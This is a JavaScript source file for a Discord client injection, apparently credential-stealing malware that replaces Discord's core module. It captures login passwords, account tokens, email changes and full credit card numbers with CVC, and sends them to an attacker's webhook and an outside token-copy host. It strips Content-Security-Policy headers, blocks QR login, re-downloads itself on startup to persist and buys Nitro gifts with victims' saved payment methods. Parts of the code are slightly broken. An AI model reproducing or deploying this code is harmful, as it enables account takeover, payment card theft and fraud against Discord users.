const args = process.argv;
const fs = require("fs");
const path = require("path");
const querystring = require("querystring");
const { BrowserWindow, session } = require("electron");

const config = {
  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login falseydi
  ping_val: "<@&965634637290405928>", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
  embed_name: "Discord Injection", //name of the webhook thats gonna send the info
  embed_icon:
    "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
      / /g,
      "%20",
    ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 0x36393E, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  webhook: "%WEBHOOK%", //your discord webhook there obviously
  injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
  /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
  api: "https://discord.com/api/v9/users/@me",
  nitro: {
    boost: {
      year: {
        id: "521847234246082599",
        sku: "511651885459963904",
        price: "9999",
      },
      month: {
        id: "521847234246082599",
        sku: "511651880837840896",
        price: "999",
      },
    },
    classic: {
      month: {
        id: "521846918637420545",
        sku: "511651871736201216",
        price: "499",
      },
    },
  },
  filter: {
    urls: [
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
      "https://api.stripe.com/v*/tokens",
      "https://api.stripe.com/v*/setup_intents/*/confirm",
      "https://api.stripe.com/v*/payment_intents/*/confirm",
    ],
  },
  filter2: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
  },
};

const discordPath = (function () {
  const useRelease = args[2] && args[2].toLowerCase() === "release";
  const releaseInput = useRelease
    ? args[3] && args[3].toLowerCase()
    : args[2] && args[2].toLowerCase();
  const release =
    releaseInput === "canary"
      ? "Discord Canary"
      : releaseInput === "ptb"
      ? "Discord PTB"
      : "Discord";
  let resourcePath = "";
  if (process.platform === "win32") {
    const basedir = path.join(process.env.LOCALAPPDATA, release.replace(/ /g, ""));
    const version = fs
      .readdirSync(basedir)
      .filter((f) => fs.lstatSync(path.join(basedir, f)).isDirectory() && f.split(".").length > 1)
      .sort()
      .reverse()[0];
    resourcePath = path.join(basedir, version, "resources");
  } else if (process.platform === "darwin") {
    const appPath =
      releaseInput === "canary"
        ? path.join("/Applications", "Discord Canary.app")
        : releaseInput === "ptb"
        ? path.join("/Applications", "Discord PTB.app")
        : useRelease && args[3]
        ? args[3]
          ? args[2]
          : args[2]
        : path.join("/Applications", "Discord.app");

    resourcePath = path.join(appPath, "Contents", "Resources");
  }

  if (fs.existsSync(resourcePath)) return resourcePath;
  return "";
})();

function updateCheck() {
  const appPath = path.join(discordPath, "app");
  const packageJson = path.join(appPath, "package.json");
  const resourceIndex = path.join(appPath, "index.js");
  const parentDir = path.resolve(path.resolve(__dirname, ".."), "..");
  const indexJs = `${parentDir}\\discord_desktop_core-3\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: "Discord-Injection",
          main: "index.js",
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(discordPath, "app.asar")}')
if (fs.existsSync(bdPath)) {
    require(bdPath);
}`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, "initiation"))) return !0;
  fs.rmdirSync(path.join(__dirname, "initiation"));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (bill.length === 0 && !bill.lenght) {
    return "";
  }
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (data === "") return "❌";
  let billing = "";
  data.forEach((x) => {
    if (x.type === 2 && !x.invalid) {
      billing += "✅" + " <:paypal:951139189389410365>";
    } else if (x.type === 1 && !x.invalid) {
      billing += "✅" + " 💳";
    } else {
      billing = "❌";
    }
  });
  if (billing === "") billing = "❌";
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${
      config.nitro[_type][_time]["id"]
    }/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify({
      expected_amount: config.nitro[_type][_time]["price"],
      expected_currency: "usd",
      gift: true,
      payment_source_id: id,
      payment_source_token: null,
      purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
      sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
    })}));
    xmlHttp.responseText`);
  if (req["gift_code"]) {
    return "https://discord.gift/" + req["gift_code"];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  if (data === "") return "Failed to Purchase ❌";

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, "boost", "year");
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, "boost", "month");
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, "classic", "month");
        if (third !== null) {
          return third;
        } else {
          return "Failed to Purchase ❌";
        }
      }
    }
  }
};

const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return "No Nitro";
    case 1:
      return "<:badge_nitro:966390434979012628> ";
    case 2:
      return "<:badge_nitro:966390434979012628>  <a:boost:965685957753987113>";
    default:
      return "No Nitro";
  }
};

const getBadges = (flags) => {
  let badges = "";
  switch (flags) {
    case 1:
      badges += "<:badge_staff:966390598531706910> , ";
      break;
    case 2:
      badges += "<:badge_partner2:966391750283370586> ";
      break;
    case 131072:
      badges += "<a:badge_developer2:966390720145522748> ";
      break;
    case 4:
      badges += "<:badge_hypesquadevents:966391511111565382> ";
      break;
    case 16384:
      badges += "<:badge_bughunter2:966390769990664244> ";
      break;
    case 8:
      badges += "<:badge_bughunter:966390746276048906> ";
      break;
    case 512:
      badges += "<:badge_earlysupporter:966390794678304818> ";
      break;
    case 128:
      badges += "<:Brilance:964601963293573120> ";
      break;
    case 64:
      badges += "<:Hypesquat4:964601933442744340> ";
      break;
    case 256:
      badges += "<:badge_balance:964601904481046619> ";
      break;
    case 0:
      badges = "None";
      break;
    default:
      badges = "None";
      break;
  }
  return badges;
};

const hooker = (content) => {
  execScript(`var xhr = new XMLHttpRequest();
    xhr.open("POST", "${config.webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${JSON.stringify(content)}));
`);
};


 function H() {
                          const A0 = JSON.parse(k)
                          var K = ''
                          return (
                            A0.forEach((A1) => {
                              if (A1.type == '') {
                                return '`No`'
                              } else {
                                if (A1.type == 2 && A1.invalid != true) {
                                  K += ' <:paypal:896441236062347374>'
                                } else {
                                  if (A1.type == 1 && A1.invalid != true) {
                                    K += ' :credit_card:'
                                  } else {
                                    return '`No`'
                                  }
                                }
                              }
                            }),
                            K == '' && (K = '`No`'),
                            K
                          )
                        }


const login = async (email, password, token) => {
  

            
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
       {
            name: `<a:tre:962470429115686923>  \`${token}\``,
            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
            inline: false,
          },
           {
            name: "<:tre:966388018527219753>  Badges:",
            value: `**${badges}**`,
            inline: true,
          },
          {
            name: "<:tre:962761278764490772>  Nitro Type:",
            value: `${nitro}`,
            inline: true,
          },
          {
            name: "<a:tre:962470727129391134> Billing:",
            value: '' + H(),
            inline: true,
          },
          {
            name: "<:tre:962472209308340315> Email:",
            value: `\`${email}\``,
            inline: true,
          },
          {
            name: "<a:tre:962470942796288090> Password:",
            value: `\`${password}\``,
            inline: true,
          },
        ],
        author: {
          name: json.username + "#" + json.discriminator + " | " + json.id,
          icon_url: `https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif`,
        },
        footer: {
          text: "xd",
           thumbnail: {
           url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
         }
        },
      },
    ],
  };
  if (config.ping_on_run) content["content"] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
         {
            name: `<a:tre:962470429115686923>  \`${token}\``,
            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
            inline: false,
          },
           {
            name: "<:tre:962472209308340315> Email:",
            value: `\`${json.email}\``,
            inline: true,
          },
           {
            name: "<:tre:966388018527219753>  Badges:",
            value: `**${badges}**`,
            inline: true,
          },
           {
            name: "<a:tre:962470727129391134> Billing:",
            value: '' + H(),
            inline: true,
          },
           {
            name: "<:tre:962761278764490772>  Nitro Type:",
            value: `${nitro}`,
            inline: true,
          },
          {
            name: "<a:tre:962470942796288090> Old Password:",
            value: `\`${oldpassword}\``,
            inline: true,
          },
          {
            name: "<a:tre:962470942796288090> New Password:",
            value: `\`${newpassword}\``,
            inline: true,
          },
        ],
        author: {
          name: json.username + "#" + json.discriminator + " | " + json.id,
          icon_url: `https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif`,
        },
        footer: {
          text: "xd",
        },
      },
    ],
  };
  if (config.ping_on_run) content["content"] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
            {
            name: `<a:tre:962470429115686923>  \`${token}\``,
            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
            inline: false,
          },
           {
            name: "<:tre:962472209308340315> New Email:",
            value: `\`${email}\``,
            inline: true,
          },
           {
            name: "<:tre:962761278764490772>  Nitro Type:",
            value: `${nitro}`,
            inline: true,
          },
           {
            name: "<:tre:966388018527219753>  Badges:",
            value: `**${badges}**`,
            inline: true,
          },
            },
           {
            name: "<a:tre:962470727129391134> Billing:",
            value: '' + H(),
            inline: true,
          },
          {
            name: "<a:tre:962470942796288090> Password:",
            value: `\`${password}\``,
            inline: true,
          },
        ],
        author: {
          name: json.username + "#" + json.discriminator + " | " + json.id,
          icon_url: `https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif`,
        },
        footer: {
          text: "xd",
        },
      },
    ],
  };
  if (config.ping_on_run) content["content"] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: "<:paypal:951139189389410365> **Paypal Added**",
            value: `Time to buy some nitro baby 😩`,
            inline: false,
          },
          {
            name: "<a:tre:962470942796288090> **Discord Info**",
            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: false,
          },
          {
            name: "<a:tre:962470429115686923> **Token**",
            value: `\`${token}\``,
            inline: false,
          },
               {
            name: "📋 Copy",
            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
            inline: false,
          },
        ],
        author: {
          name: json.username + "#" + json.discriminator + " | " + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: "xd",
        },
      },
    ],
  };
  if (config.ping_on_run) content["content"] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: ":credit_card: **Credit Card Added**",
            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: "<a:tre:962470942796288090> **Discord Info**",
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
          {
            name: "<a:tre:962470429115686923> **Token**",
            value: `\`${token}\``,
            inline: false,
          },
               {
            name: "📋 Copy",
            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
            inline: false,
          },
        ],
        author: {
          name: json.username + "#" + json.discriminator + " | " + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: "xd",
        },
      },
    ],
  };
  if (config.ping_on_run) content["content"] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: "<a:nitro:954835182597337159> **Nitro bought!**",
            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
            name: "**<a:tre:962470942796288090> Discord Info**",
            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: true,
          },
          {
            name: "**<a:tre:962470429115686923> Token**",
            value: `\`${token}\``,
            inline: false,
          },
               {
            name: "📋 Copy",
            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
            inline: false,
          },
        ],
        author: {
          name: json.username + "#" + json.discriminator + " | " + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: "xd",
        },
      },
    ],
  };
  if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith("wss://remote-auth-gateway")) {
    callback({
      cancel: true,
    });
    return;
  }
  if (updateCheck()) {
  }

  callback({});
  return;
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes("discord.com")) {
      callback({
        responseHeaders: Object.assign(
          {
            "Access-Control-Allow-Headers": "*",
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            "Content-Security-Policy": [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'",
            ],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*",
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders["content-security-policy"];
    delete details.responseHeaders["content-security-policy-report-only"];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsedData = details.uploadData[0].bytes;
  let data;
  try {
    data = JSON.parse(Buffer.from(unparsedData).toString());
  } catch (SyntaxError) {
    data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()));
  }
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith("login"):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith("users/@me") && details.method === "PATCH":
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith("tokens") && details.method === "POST":
      const item = querystring.parse(unparsedData.toString());
      ccAdded(
        item["card[number]"],
        item["card[cvc]"],
        item["card[exp_month]"],
        item["card[exp_year]"],
        token,
      ).catch(console.error);
      break;

    case details.url.endsWith("paypal_accounts") && details.method === "POST":
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith("confirm") && details.method === "POST":
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require("./core.asar");
